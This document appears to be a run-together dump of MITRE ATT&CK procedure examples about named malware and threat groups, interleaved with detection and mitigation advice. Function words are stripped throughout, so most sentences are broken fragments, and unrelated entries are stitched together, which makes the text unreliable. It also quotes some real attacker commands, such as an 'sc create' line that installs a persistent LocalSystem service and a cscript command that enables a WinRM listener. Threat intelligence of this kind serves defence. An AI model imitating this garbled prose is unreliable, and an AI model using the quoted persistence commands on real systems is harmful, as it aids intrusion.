[WINDSHIELD](https://attack.mitre.org/software/S0155) C2 traffic communicate TCP raw sockets.(Citation: FireEye APT32 2017) [QUADAGENT](https://attack.mitre.org/software/S0269) AES preshared key decrypt custom Base64 routine encode strings scripts.(Citation: Unit 42 QUADAGENT July 2018) [Crimson](https://attack.mitre.org/software/S0115) command collect anti-virus software victim.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) [SILENTTRINITY](https://attack.mitre.org/software/S0692) `System.DirectoryServices` namespace retrieve domain information.(Citation: GitHub SILENTTRINITY Modules July 2019) [JHUHUGIT](https://attack.mitre.org/software/S0044) variant gathers network interface card information.(Citation: Unit 42 Playbook Dec 2017) [Ke3chang](https://attack.mitre.org/groups/G0004) implants capable collecting signed-in username.(Citation: NICKEL December 2021) [China Chopper](https://attack.mitre.org/software/S0020)'s server component capable command terminal.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Lee 2013)(Citation: NCSC Joint Report Public Tools) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors [zwShell](https://attack.mitre.org/software/S0350) generate Trojan variants, control victim machines, exfiltrate data.(Citation: McAfee Night Dragon) [TeamTNT](https://attack.mitre.org/groups/G0139) batch scripts startup folder.(Citation: ATT TeamTNT Chimaera September 2020) [CookieMiner](https://attack.mitre.org/software/S0492) steal saved usernames passwords Chrome credit card credentials.(Citation: Unit42 CookieMiner Jan 2019) [Netwalker](https://attack.mitre.org/software/S0457) detect terminate active security software-related processes infected systems.(Citation: TrendMicro Netwalker 2020)(Citation: Sophos Netwalker 2020) [Sys10](https://attack.mitre.org/software/S0060) XOR 0x1 loop encrypt C2 domain.(Citation: Baumgartner Naikon 2015) [NativeZone](https://attack.mitre.org/software/S0637) display RTF document user  enable execution  [Cobalt Strike](https://attack.mitre.org/software/S0154) stage shellcode.(Citation: MSTIC Nobelium Toolset 2021) [Patchwork](https://attack.mitre.org/groups/G0040) BITS jobs download malicious payloads.(Citation: Unit 42 BackConfig 2020) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Peirates](https://attack.mitre.org/software/S0683) gain reverse host node mounting Kubernetes hostPath.(Citation: Peirates GitHub) [More_eggs](https://attack.mitre.org/software/S0284) HTTPS C2.(Citation: Talos Cobalt July 2018)(Citation: Security Intelligence Eggs Aug 2019) [Dridex](https://attack.mitre.org/software/S0384) <code>OutputDebugStringW</code> function avoid malware analysis anti-debugging technique.(Citation: Checkpoint Dridex Jan 2021)  Identify correct GPO permissions abuse opportunities (ex: GPO modification privileges) auditing tools [BloodHound](https://attack.mitre.org/software/S0521) (version 1.5.1 later).(Citation: GitHub Bloodhound) [Reg](https://attack.mitre.org/software/S0075) credentials Windows Registry.(Citation: Pentestlab Stored Credentials) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. [Cuba](https://attack.mitre.org/software/S0625) check Russian language installed infected machine function <code>GetKeyboardLayoutList</code>.(Citation: McAfee Cuba April 2021)  [Micropsia](https://attack.mitre.org/software/S0339) perform recursive directory listing volume drives victim's machine fetch specific files paths.(Citation: Radware Micropsia July 2018) [Zeus Panda](https://attack.mitre.org/software/S0330) checks anti-virus, anti-spyware, firewall products installed victim’s environment.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017) [WIRTE](https://attack.mitre.org/groups/G0090) Base64 decode malicious VBS script.(Citation: Lab52 WIRTE Apr 2019) (Citation: Mandiant APT1) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) ability files compromised host.(Citation: ANSSI Sandworm January 2021) [Elise](https://attack.mitre.org/software/S0081) encrypts exfiltrated data RC4.(Citation: Lotus Blossom Jun 2015) [Orz](https://attack.mitre.org/software/S0229) Technet Pastebin command control.(Citation: Proofpoint Leviathan Oct 2017) [VaporRage](https://attack.mitre.org/software/S0636) deobfuscate XOR-encoded shellcode prior execution.(Citation: MSTIC Nobelium Toolset 2021) Monitor newly constructed files written extensions headers compressed encrypted file types. Detection efforts focus follow-on exfiltration activity, compressed encrypted files detected transit network intrusion detection data loss prevention analyzing file headers. [Ke3chang](https://attack.mitre.org/groups/G0004) implants collect language compromised machine.(Citation: NICKEL December 2021) [Magic Hound](https://attack.mitre.org/groups/G0059) established email accounts fake personas spearphishing operations.(Citation: IBM ITG18 2020)(Citation: Proofpoint TA453 March 2021) [Torisma](https://attack.mitre.org/software/S0678) collect current time victim machine.(Citation: McAfee Lazarus Nov 2020) [Anchor](https://attack.mitre.org/software/S0504) terminate specific execution flags present.(Citation: Cyberreason Anchor December 2019) [Winnti Windows](https://attack.mitre.org/software/S0141) XOR encrypt C2 traffic.(Citation: Novetta Winnti April 2015) [Silent Librarian](https://attack.mitre.org/groups/G0122) Encrypt SSL certificates phishing pages.(Citation: Phish Labs Silent Librarian)(Citation: Secureworks COBALT DICKENS September 2019) Monitoring user's <code>.bash_history</code> read alert suspicious activity. [Patchwork](https://attack.mitre.org/groups/G0040) altered [NDiskMonitor](https://attack.mitre.org/software/S0272) samples adding bytes random letters attempt change file hashes.(Citation: TrendMicro Patchwork Dec 2017) [GALLIUM](https://attack.mitre.org/groups/G0093) <code>reg</code> commands dump specific hives Windows Registry, SAM hive, password hashes.(Citation: Cybereason Soft Cell June 2019) [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) hosted malicious documents domains registered group.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)  [Milan](https://attack.mitre.org/software/S1015) ability DNS C2 communications.(Citation: ClearSky Siamesekitten August 2021)(Citation: Kaspersky Lyceum October 2021)(Citation: Accenture Lyceum Targets November 2021) [Windshift](https://attack.mitre.org/groups/G0112) malware identify installed AV commonly forensic malware analysis tools.(Citation: BlackBerry Bahamut) [Lazarus Group](https://attack.mitre.org/groups/G0032) keylogger KiloAlfa obtains user tokens interactive sessions execute API <code>CreateProcessAsUserA</code> user's context.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Tools) [TinyTurla](https://attack.mitre.org/software/S0668) `WinHTTP`, `CreateProcess`, APIs C2 communications functions.(Citation: Talos TinyTurla September 2021) Network intrusion detection prevention systems network signatures identify traffic specific adversary command control infrastructure malware mitigate activity network level.  [APT38](https://attack.mitre.org/groups/G0082) Trojan called KEYLIME capture keystrokes victim’s machine.(Citation: FireEye APT38 Oct 2018) [Misdat](https://attack.mitre.org/software/S0083) capable running commands list files directories, enumerating logical drives.(Citation: Cylance Dust Storm) [Winnti Windows](https://attack.mitre.org/software/S0141) check presence specific files prior moving phase execution.(Citation: Novetta Winnti April 2015) [Turla](https://attack.mitre.org/groups/G0010) created accounts including Dropbox GitHub C2 document exfiltration.(Citation: ESET Crutch December 2020) [PowerPunch](https://attack.mitre.org/software/S0685) Base64-encoded scripts.(Citation: Actinium February 2022) cloud environments, ensure users explicitly require permissions update instance metadata configurations so. Restrict granting permissions listing objects cloud storage accounts. Monitor creation login hook files (<code>/Library/Preferences/com.apple.loginwindow.plist</code>), unusual accounts normal administration duties. [PoisonIvy](https://attack.mitre.org/software/S0012) backdoor TCP ports 6868 7777.(Citation: Symantec Darkmoon Aug 2005) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) mofcomp.exe establish WMI Event Subscription persistence mechanisms configured *.mof file.(Citation: RedCanary Mockingbird 2020) [Flagpro](https://attack.mitre.org/software/S0696) check target Japanese, Taiwanese, English detection specific Windows Security Internet Explorer dialog.(Citation: NTT Security Flagpro December 2021)  application control appropriate. VBA macros Internet, based file's Mark (MOTW) attribute, blocked executing Office applications (ex: Access, Excel, PowerPoint, Visio, Word) default starting Windows Version 2203.(Citation: Default VBS macros Blocking ) [BlackEnergy](https://attack.mitre.org/software/S0089) injects DLL component svchost.exe.(Citation: F-Secure BlackEnergy 2014) [admin@338](https://attack.mitre.org/groups/G0018) emails malicious Office documents attached.(Citation: FireEye admin@338) [GALLIUM](https://attack.mitre.org/groups/G0093) leveraged valid accounts maintain access victim network.(Citation: Cybereason Soft Cell June 2019) [SDBbot](https://attack.mitre.org/software/S0461) ability port forwarding establish proxy target host C2.(Citation: Proofpoint TA505 October 2019) [Turla](https://attack.mitre.org/groups/G0010) Metasploit perform reflective DLL injection escalate privileges.(Citation: ESET Turla Mosquito 2018)(Citation: Github Rapid7 Meterpreter Elevate) [JHUHUGIT](https://attack.mitre.org/software/S0044) registered scheduled task time current user logs in.(Citation: ESET Sednit 1)(Citation: ESET Sednit July 2015) [LAPSUS$](https://attack.mitre.org/groups/G1004) tools Explorer inspection software operations.(Citation: MSTIC DEV-0537 Mar 2022) [Dragonfly](https://attack.mitre.org/groups/G0035) batch scripts enumerate network information, including trusts, zones, domain.(Citation: US-CERT TA18-074A) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors packers read pixel data images contained files' resource sections build layer execution data.(Citation: ESET Operation Spalax Jan 2021) [KOCTOPUS](https://attack.mitre.org/software/S0669) deleted Registry.(Citation: MalwareBytes LazyScripter Feb 2021) [APT41](https://attack.mitre.org/groups/G0096) leveraged PowerShell deploy malware families victims’ environments.(Citation: FireEye APT41 Aug 2019)(Citation: FireEye APT41 March 2020) [Windshift](https://attack.mitre.org/groups/G0112) spearphishing emails attachment harvest credentials deliver malware.(Citation: SANS Windshift August 2018) (Citation: Kaspersky Turla) [SombRAT](https://attack.mitre.org/software/S0615) ability embedded SOCKS proxy C2 communications.(Citation: CISA AR21-126A FIVEHANDS 2021) [OopsIE](https://attack.mitre.org/software/S0264) exfiltrates command output collected files C2 server 1500-byte blocks.(Citation: Unit 42 OopsIE! Feb 2018) [APT18](https://attack.mitre.org/groups/G0026) actors leverage legitimate credentials log external remote services.(Citation: RSA2017 Detect Respond Adair) [FIN5](https://attack.mitre.org/groups/G0053) [SDelete](https://attack.mitre.org/software/S0195) clean environment attempt prevent detection.(Citation: Mandiant FIN5 GrrCON Oct 2016) [GreyEnergy](https://attack.mitre.org/software/S0342) PsExec locally execute rundll32.exe privileges (NTAUTHORITY\SYSTEM).(Citation: ESET GreyEnergy Oct 2018) [Hikit](https://attack.mitre.org/software/S0009) [DLL Search Hijacking](https://attack.mitre.org/techniques/T1574/001) load <code>oci.dll</code> persistence mechanism.(Citation: FireEye Hikit Rootkit) [Cyclops Blink](https://attack.mitre.org/software/S0687) rename running process <code>[kworker:0/1]</code> masquerade Linux kernel thread. [Cyclops Blink](https://attack.mitre.org/software/S0687) named RC scripts persistence WatchGuard artifacts.(Citation: NCSC Cyclops Blink February 2022) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) spearphishing emails malicious Word attachments infect victims.(Citation: Symantec Tick Apr 2016)(Citation: Trend Micro Tick November 2019) [Carbanak](https://attack.mitre.org/groups/G0008) [netsh](https://attack.mitre.org/software/S0108) add local firewall rule exceptions.(Citation: Group-IB Anunak) [Rclone](https://attack.mitre.org/software/S1040) exfiltrate data cloud storage services Dropbox, Google Drive, Amazon S3, MEGA.(Citation: Rclone)(Citation: DFIR Conti Bazar Nov 2021) [GreyEnergy](https://attack.mitre.org/software/S0342) securely delete file hooking DeleteFileA DeleteFileW functions Windows API.(Citation: ESET GreyEnergy Oct 2018) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors malware, including [Remcos](https://attack.mitre.org/software/S0332), [njRAT](https://attack.mitre.org/software/S0385), AsyncRAT.(Citation: ESET Operation Spalax Jan 2021) Application whitelisting software restriction tools, SELinux, aide restricting kernel module loading. (Citation: Kernel.org Restrict Kernel Module) [WIRTE](https://attack.mitre.org/groups/G0090) emails intended victims malicious Word Excel attachments.(Citation: Kaspersky WIRTE November 2021) (Citation: Talos ZxShell Oct 2014)(Citation: Cisco 72) [Gelsemium](https://attack.mitre.org/software/S0666) ability TCP UDP C2 communications.(Citation: ESET Gelsemium June 2021) [Fysbis](https://attack.mitre.org/software/S0410) perform keylogging.(Citation: Fysbis Palo Alto Analysis)  [Bisonal](https://attack.mitre.org/software/S0268) list running processes victim’s machine.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)(Citation: Talos Bisonal Mar 2020) [Cobalt Group](https://attack.mitre.org/groups/G0080) created Windows tasks establish persistence.(Citation: IB Cobalt Aug 2017) [admin@338](https://attack.mitre.org/groups/G0018) actors command exploiting machine [LOWBALL](https://attack.mitre.org/software/S0042) malware acquire local networks: <code>ipconfig /all >> %temp%\download</code>(Citation: FireEye admin@338) [APT28](https://attack.mitre.org/groups/G0007) encrypted .dll payload RTL custom encryption algorithm. [APT28](https://attack.mitre.org/groups/G0007) obfuscated payloads base64, XOR, RC4.(Citation: Bitdefender APT28 Dec 2015)(Citation: Unit 42 Sofacy Feb 2018)(Citation: Palo Alto Sofacy 06-2018)(Citation: Talos Seduploader Oct 2017)(Citation: Accenture SNAKEMACKEREL Nov 2018) [SILENTTRINITY](https://attack.mitre.org/software/S0692) load additional files tools, including [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub SILENTTRINITY Modules July 2019) [APT29](https://attack.mitre.org/groups/G0016) 7-Zip decode [Raindrop](https://attack.mitre.org/software/S0565) malware.(Citation: Symantec RAINDROP January 2021) [Gorgon Group](https://attack.mitre.org/groups/G0078) malware decode contents payload Base64 encoded write contents file.(Citation: Unit 42 Gorgon Aug 2018) Monitor newly executed processes conducting malicious activity  (Citation: Proofpoint TA505 Mar 2018)(Citation: Trend Micro TA505 June 2019)(Citation: Proofpoint TA505 October 2019) (Citation: DFIR Report APT35 ProxyShell March 2022) [Ebury](https://attack.mitre.org/software/S0377) DNS requests UDP port 53 C2.(Citation: ESET Ebury Feb 2014)	 [HTRAN](https://attack.mitre.org/software/S0040) proxy TCP socket connections obfuscate command control infrastructure.(Citation: Operation Quantum Entanglement)(Citation: NCSC Joint Report Public Tools) [PoetRAT](https://attack.mitre.org/software/S0428) .NET tool named dog.exe exiltrate e-mail account.(Citation: Talos PoetRAT April 2020) [StoneDrill](https://attack.mitre.org/software/S0380) observed deleting temporary files fulfill task.(Citation: Kaspersky StoneDrill 2017)	 [GeminiDuke](https://attack.mitre.org/software/S0049) collects victim, including installed drivers, programs executed users, programs services configured automatically startup, files folders user's folder, files folders user's Documents, programs installed Program Files folder, accessed files, folders, programs.(Citation: F-Secure Dukes) [STARWHALE](https://attack.mitre.org/software/S1037) ability create Windows service establish persistence infected host: `sc create Windowscarpstss binpath= "cmd.exe /c cscript.exe c:\\windows\\system32\\w7_1.wsf humpback_whale" start= "auto" obj= "LocalSystem"`.(Citation: Mandiant UNC3313 Feb 2022) [APT28](https://attack.mitre.org/groups/G0007) exploited Office vulnerability CVE-2017-0262 execution.(Citation: Securelist Sofacy Feb 2018) [Pandora](https://attack.mitre.org/software/S0664) ability encrypt communications D3DES.(Citation: Trend Micro Iron Tiger April 2021) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) tool Windows Command remote host.(Citation: Zscaler APT31 Covid-19 October 2020) [APT28](https://attack.mitre.org/groups/G0007) compromised email accounts send credential phishing emails.(Citation: Google TAG Ukraine Threat Landscape March 2022) [Threat Group-3390](https://attack.mitre.org/groups/G0027) locally staged encrypted archives exfiltration efforts.(Citation: SecureWorks BRONZE UNION June 2017) Monitor third-party application logging, messaging, artifacts alternate authentication material, password hashes, Kerberos tickets, application access tokens, laterally environment bypass normal access controls. [Dtrack](https://attack.mitre.org/software/S0567) collect victim's name, hostname adapter create unique identifier.(Citation: Securelist Dtrack)(Citation: CyberBit Dtrack) [Fox Kitten](https://attack.mitre.org/groups/G0117) brute forced RDP credentials.(Citation: ClearSky Pay2Kitten December 2020) [StreamEx](https://attack.mitre.org/software/S0142) rundll32 exported function.(Citation: Cylance Crew Feb 2017) (Citation: TrendMicro Tropic Trooper 2020) [Chaes](https://attack.mitre.org/software/S0631) Base64 encode C2 communications.(Citation: Cybereason Chaes Nov 2020)  [MuddyWater](https://attack.mitre.org/groups/G0069) malware leveraged WMI execution querying host information.(Citation: Securelist MuddyWater Oct 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: Talos MuddyWater 2019)(Citation: DHS CISA AA22-055A MuddyWater February 2022) updating Windows version patch level utilize protective measures UAC bypass.(Citation: Github UACMe) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors enabled WinRM HTTP/HTTPS backup persistence mechanism command: `cscript //nologo "C:\Windows\System32\winrm.vbs" set winrm/config/service@{EnableCompatibilityHttpsListener="true"}`.(Citation: Cybereason OperationCuckooBees 2022) Monitor service driver installations loads (ex: Sysmon Event 6) software update/patch cycles. [InvisiMole](https://attack.mitre.org/software/S0260) Windows services execute malicious payload.(Citation: ESET InvisiMole June 2020) Monitor API calls attempt dump credentials account login credential material, form hash password, operating software. [Bisonal](https://attack.mitre.org/software/S0268) capability download files execute victim’s machine.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)(Citation: Talos Bisonal Mar 2020)  [LAPSUS$](https://attack.mitre.org/groups/G1004) deleted target's systems resources on-premises cloud.(Citation: MSTIC DEV-0537 Mar 2022) [Threat Group-3390](https://attack.mitre.org/groups/G0027) exploited CVE-2018-0798 Equation Editor.(Citation: Trend Micro Iron Tiger April 2021) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) collected hardware details victim's system, including CPU memory information.(Citation: RedCanary Mockingbird 2020) [Pupy](https://attack.mitre.org/software/S0192) list local remote shared drives folders SMB.(Citation: GitHub Pupy) [BADNEWS](https://attack.mitre.org/software/S0128) encrypts C2 data ROR 3 XOR 0x23.(Citation: Forcepoint Monsoon)(Citation: TrendMicro Patchwork Dec 2017) [APT28](https://attack.mitre.org/groups/G0007) collected emails victim Exchange servers.(Citation: DOJ GRU Indictment Jul 2018)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [Dark Caracal](https://attack.mitre.org/groups/G0070) macros Word documents download stage executed.(Citation: Lookout Dark Caracal Jan 2018) [SQLRat](https://attack.mitre.org/software/S0390) SQL execute JavaScript VB scripts host system.(Citation: Flashpoint FIN 7 March 2019) [Wingbird](https://attack.mitre.org/software/S0176) loads malicious file, sspisrv.dll, spoofed lssas.exe service.(Citation: SIR 21)(Citation: Wingbird Nov 2017) [Emotet](https://attack.mitre.org/software/S0367) leverages Admin$ share lateral movement local admin password brute forced. (Citation: Malwarebytes Emotet Dec 2017)  [NDiskMonitor](https://attack.mitre.org/software/S0272) AES encrypt C2 channel.(Citation: TrendMicro Patchwork Dec 2017) [RainyDay](https://attack.mitre.org/software/S0629) file exfiltration tool upload specific files Dropbox.(Citation: Bitdefender Naikon April 2021)	 
 [Agent Tesla](https://attack.mitre.org/software/S0331) wmi queries gather system.(Citation: Bitdefender Agent Tesla April 2020)  [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Get-Keystrokes</code> Exfiltration module log keystrokes.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [RCSession](https://attack.mitre.org/software/S0662) launch hollowed svchost.exe process.(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Trend Micro DRBControl February 2020)(Citation: Profero APT27 December 2020) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [Proxysvc](https://attack.mitre.org/software/S0238) SSL communicate commands control server.(Citation: McAfee GhostSecret) [APT41](https://attack.mitre.org/groups/G0096) deployed rootkits Linux systems.(Citation: FireEye APT41 Aug 2019)(Citation: Crowdstrike GTR2020 Mar 2020) [Lizar](https://attack.mitre.org/software/S0681) retrieve browser history database files.(Citation: Threatpost Lizar 2021)(Citation: BiZone Lizar 2021)  [Remcos](https://attack.mitre.org/software/S0332) add Registry key <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> persistence.(Citation: Fortinet Remcos Feb 2017) Monitor commands arguments executed container services. Docker, daemon log insight events daemon container service level. Kubernetes component logs detect activities running containers cluster. [RTM](https://attack.mitre.org/groups/G0048) attempted lure victims e-mail attachments execute malicious code.(Citation: IB RTM August 2019) [Sidewinder](https://attack.mitre.org/groups/G0121) collected stolen files temporary folder preparation exfiltration.(Citation: ATT Sidewinder January 2021) Monitor events collected attempt cloud permission settings.  (Citation: Cybereason Cobalt Kitty 2017) [BackConfig](https://attack.mitre.org/software/S0475) leverage API functions <code>ShellExecuteA</code> <code>HttpOpenRequestA</code> process downloading executing files.(Citation: Unit 42 BackConfig 2020) [Hydraq](https://attack.mitre.org/software/S0203) svchost.exe execute malicious DLL included service group.(Citation: Symantec Hydraq Persistence Jan 2010) Windows Policy manage root certificates <code>Flags</code> <code>HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\ProtectedRoots</code> set 1 prevent non-administrator users root installations HKCU certificate store. (Citation: SpectorOps Code Signing Dec 2017) Monitor newly constructed /etc/rc.local file  [APT3](https://attack.mitre.org/groups/G0022) <code>-WindowStyle Hidden</code> conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) windows.(Citation: FireEye Operation Double Tap) (Citation: US-CERT BADCALL) [StrifeWater](https://attack.mitre.org/software/S1034) execute commands `cmd.exe`.(Citation: Cybereason StrifeWater Feb 2022) Monitor library load events, unusual creation binary files loading processes. libraries recognized loaded process. [Aoqin Dragon](https://attack.mitre.org/groups/G1007) lured victims weaponized documents, fake external drives, fake antivirus execute malicious payloads.(Citation: SentinelOne Aoqin Dragon June 2022) [REvil](https://attack.mitre.org/software/S0496) encrypt files victim systems demands ransom decrypt files.(Citation: Kaspersky Sodin July 2019)(Citation: Cylance Sodinokibi July 2019)(Citation: Talos Sodinokibi April 2019)(Citation: McAfee REvil October 2019)(Citation: Intel 471 REvil March 2020)(Citation: Picus Sodinokibi January 2020)(Citation: Secureworks REvil September 2019)(Citation: Tetra Defense Sodinokibi March 2020) [APT38](https://attack.mitre.org/groups/G0082) identified security software, configurations, defensive tools, sensors installed compromised system.(Citation: CISA AA20-239A BeagleBoyz August 2020) [BLINDINGCAN](https://attack.mitre.org/software/S0520) downloaded files victim machine.(Citation: US-CERT BLINDINGCAN Aug 2020) service Registry entries correlate software, patch cycles, etc. Service stored Registry <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. binary path service startup type changed manual disabled automatic, typically so, suspicious. Tools Sysinternals Autoruns detect service attempts persistence.(Citation: TechNet Autoruns) [Mosquito](https://attack.mitre.org/software/S0256) runs <code>whoami</code> victim’s machine.(Citation: ESET Turla Mosquito Jan 2018) [ZeroT](https://attack.mitre.org/software/S0230) samples perform UAC bypass eventvwr.exe execute malicious file.(Citation: Proofpoint ZeroT Feb 2017) [Netwalker](https://attack.mitre.org/software/S0457) determine architecture running choose version DLL use.(Citation: TrendMicro Netwalker 2020) [SpeakUp](https://attack.mitre.org/software/S0374) downloads executes additional files remote server. (Citation: CheckPoint SpeakUp Feb 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) conduct image hijack `.msc` file extension UAC bypass process.(Citation: GitHub SILENTTRINITY Modules July 2019) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) GitHub host malware linked spearphishing e-mails.(Citation: Google Election Threats October 2020)(Citation: Zscaler APT31 Covid-19 October 2020) Update software regularly include patches DLL side-loading vulnerabilities. implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. Monitor newly constructed files absolute paths shared libraries LD_PRELOAD Linux DYLD_INSERT_LIBRARIES macOS. [BoxCaon](https://attack.mitre.org/software/S0651) searched files system, documents located desktop folder.(Citation: Checkpoint IndigoZebra July 2021) variant [HOPLIGHT](https://attack.mitre.org/software/S0376) hooks lsass.exe, lsass.exe checks Registry data 'rdpproto' key <code>SYSTEM\CurrentControlSet\Control\Lsa Name</code>.(Citation: US-CERT HOPLIGHT Apr 2019) [Lazarus Group](https://attack.mitre.org/groups/G0032) Themida pack malicious DLLs files.(Citation: ClearSky Lazarus Aug 2020)(Citation: McAfee Lazarus Nov 2020) monitoring <code>/usr/libexec/security_authtrampoline</code> executions <code>AuthorizationExecuteWithPrivileges</code> executed. MacOS logs <code>AuthorizationExecuteWithPrivileges</code> called. [Mimikatz](https://attack.mitre.org/software/S0002)'s <code>CRYPTO::Extract</code> module extract interacting Windows cryptographic application programming interface (API) functions.(Citation: Adsecurity Mimikatz Guide) [KillDisk](https://attack.mitre.org/software/S0607) called Windows API retrieve hard disk handle shut machine.(Citation: Trend Micro KillDisk 1) Variants [Emissary](https://attack.mitre.org/software/S0082) rundll32.exe Registry values establish persistence.(Citation: Emissary Trojan Feb 2016) [PoshC2](https://attack.mitre.org/software/S0378) modules WMI execute tasks.(Citation: GitHub PoshC2) Monitor unexpected cloud user accounts, Azure Activity Logs highlighting malicious Service Principal Application modifications. 

Monitor API CLI commands add access accounts, <code>CreateAccessKey</code> AWS <code>service-accounts create</code> GCP. monitor usage APIs create import SSH keys, unexpected users accounts root account.  [Kimsuky](https://attack.mitre.org/groups/G0094) decoded malicious VBScripts Base64.(Citation: Talos Kimsuky Nov 2021) [Cleaver](https://attack.mitre.org/groups/G0003) dump credentials Mimikatz Windows Credential Editor.(Citation: Cylance Cleaver) Monitor contextual data malicious payload, compilation times, file hashes, watermarks identifiable configuration information. activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Defense Evasion Command Control. (Citation: FireEye Operation Double Tap) [Xbash](https://attack.mitre.org/software/S0341) destroyed Linux-based databases ransomware capabilities.(Citation: Unit42 Xbash Sept 2018)	 (Citation: Unit 42 Sofacy Feb 2018)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) monitor DLL load operations lsass.exe. (Citation: DLL Security) [Raindrop](https://attack.mitre.org/software/S0565) custom packer [Cobalt Strike](https://attack.mitre.org/software/S0154) payload, compressed LZMA algorithm.(Citation: Symantec RAINDROP January 2021)(Citation: Deep Dive Solorigate January 2021) Monitor third-party application logging, messaging, artifacts deface systems external organization attempt deliver messaging, intimidate, mislead organization users.  [Bumblebee](https://attack.mitre.org/software/S1039) WMI gather spawn processes code injection.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022)(Citation: Cybereason Bumblebee August 2022) Regularly check component software critical services adversaries target persistence verify integrity systems identify unexpected made.  [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `dir c:\\` search files.(Citation: Cybereason OperationCuckooBees 2022) [Lucifer](https://attack.mitre.org/software/S0532) decrypt C2 address execution.(Citation: Unit 42 Lucifer June 2020) (Citation: Cylance Dust Storm) [Valak](https://attack.mitre.org/software/S0476) ability enumerate running processes compromised host.(Citation: Cybereason Valak 2020) [Wizard Spider](https://attack.mitre.org/groups/G0102) cmd.exe execute commands victim's machine.(Citation: DFIR Ryuk's Return October 2020) [Mustang Panda](https://attack.mitre.org/groups/G0129) encrypted C2 communications RC4.(Citation: Recorded Future REDDELTA July 2020) [RTM](https://attack.mitre.org/software/S0148) command rundll32.exe execute.(Citation: ESET RTM Feb 2017) [Crutch](https://attack.mitre.org/software/S0538) conducted C2 communications Dropbox account API.(Citation: ESET Crutch December 2020) [REvil](https://attack.mitre.org/software/S0496) Windows command delete volume shadow copies disable recovery.(Citation: Cylance Sodinokibi July 2019)(Citation: Talos Sodinokibi April 2019)(Citation: Picus Sodinokibi January 2020)(Citation: Secureworks REvil September 2019) [Leviathan](https://attack.mitre.org/groups/G0065) received C2 instructions user profiles created legitimate websites Github TechNet.(Citation: FireEye Periscope March 2018) [PcShare](https://attack.mitre.org/software/S1050) C2 communication.(Citation: Bitdefender FunnyDream Campaign November 2020) [Kazuar](https://attack.mitre.org/software/S0265) adds sub-key Registry keys.(Citation: Unit 42 Kazuar 2017) [PowerDuke](https://attack.mitre.org/software/S0139) rundll32.exe load.(Citation: Volexity PowerDuke November 2016) [BitPaymer](https://attack.mitre.org/software/S0570) compares file names paths list excluded names directory names encryption.(Citation: Crowdstrike Indrik November 2018) (Citation: 365 Defender Solorigate) [TSCookie](https://attack.mitre.org/software/S0436) ability list processes infected host.(Citation: JPCert TSCookie March 2018) [KONNI](https://attack.mitre.org/software/S0356) modified ComSysApp service load malicious DLL payload.(Citation: Medium KONNI Jan 2020) (Citation: TrendMicro Patchwork Dec 2017) [Javali](https://attack.mitre.org/software/S0528) DLL side-loading load malicious DLLs legitimate executables.(Citation: Securelist Brazilian Banking Malware July 2020) Allowlist MIB objects implement SNMP views.(Citation: Cisco Securing SNMP) [Agent Tesla](https://attack.mitre.org/software/S0331) executed malicious e-mail attachments (Citation: Bitdefender Agent Tesla April 2020) [Remsec](https://attack.mitre.org/software/S0125) exfiltrate data DNS tunnel email, separately C2 channel.(Citation: Kaspersky ProjectSauron Report) [FIN8](https://attack.mitre.org/groups/G0061) Registry detect avoid executing potential sandboxes.(Citation: FireEye Enemy FIN8 Aug 2016) [Lazarus Group](https://attack.mitre.org/groups/G0032) SSH PuTTy PSCP utility gain access restricted segment compromised network.(Citation: Kaspersky ThreatNeedle Feb 2021) [Linux Rabbit](https://attack.mitre.org/software/S0362) brute forces SSH passwords attempt gain access install malware server. (Citation: Anomali Linux Rabbit 2018) Monitor account activity attempts create share data, snapshots backups, untrusted unusual accounts. [CreepyDrive](https://attack.mitre.org/software/S1023) cloud services including OneDrive data exfiltration.(Citation: POLONIUM June 2022) Monitor newly executed processes circumvent mechanisms designed control elevate privileges gain higher-level permissions. [Fox Kitten](https://attack.mitre.org/groups/G0117) exploited vulnerabilities remote services including RDP.(Citation: ClearkSky Fox Kitten February 2020)(Citation: CrowdStrike PIONEER KITTEN August 2020)(Citation: ClearSky 